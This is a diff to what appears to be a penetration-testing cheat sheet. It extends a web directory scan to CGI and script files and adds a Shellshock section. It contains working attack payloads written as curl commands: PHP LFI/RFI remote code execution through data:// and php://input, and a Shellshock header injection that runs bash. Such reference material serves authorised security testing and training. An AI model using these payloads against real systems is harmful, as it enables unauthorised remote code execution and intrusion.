@@ -154,7 +154,7 @@ nmap -p 80,443 --script=http-* <target_ip>
 ### File/Directory Enumeration
 
 ```bash
-gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,git
+gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,git,cgi,pl,sh
 ```
 
 - Web Reconnaissance Quick Checklist
@@ -216,15 +216,23 @@ msf6 > use auxiliary/scanner/http/http_put
 - If find Local File Inclusion and Remote File Inclusion (reading source code can help identify the vulnerabilities sometime)
     Use the LFI/RFI & Web Attack Payloads to exploit the site
 
-### LFI/RFI & Web Attack Payloads
+- If find `cgi` page and confirm it's vulnerable with `http-shellshock.nse`
+  Use Shellshock Vuln payload to attack
 
-- RCE via GET payload
+### LFI/RFI & OS Command Injection Payloads
+
+- RCE via GET Payload
   ```bash
   curl "http://<target_ip>/<vuln_php_page>?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=<command>"
   ```
-- RCE via POST payload
+- RCE via POST Payload
   ```bash
   curl -X POST "http://<target_ip>/<vuln_php_page>?page=php://input" -H "Content-Type: application/x-www-form-urlencoded" --data-binary "<?php system('<command>'); ?>"
+  ```
+
+- Shellshock Vuln Payload
+  ```bash
+  `curl http://<target_ip>/<cgi_page> -H "User-Agent: () { :;}; echo; echo 'Content-Type: text/plain'; echo; /bin/bash -c '<command>'`
   ```
 
 ### Brute Force
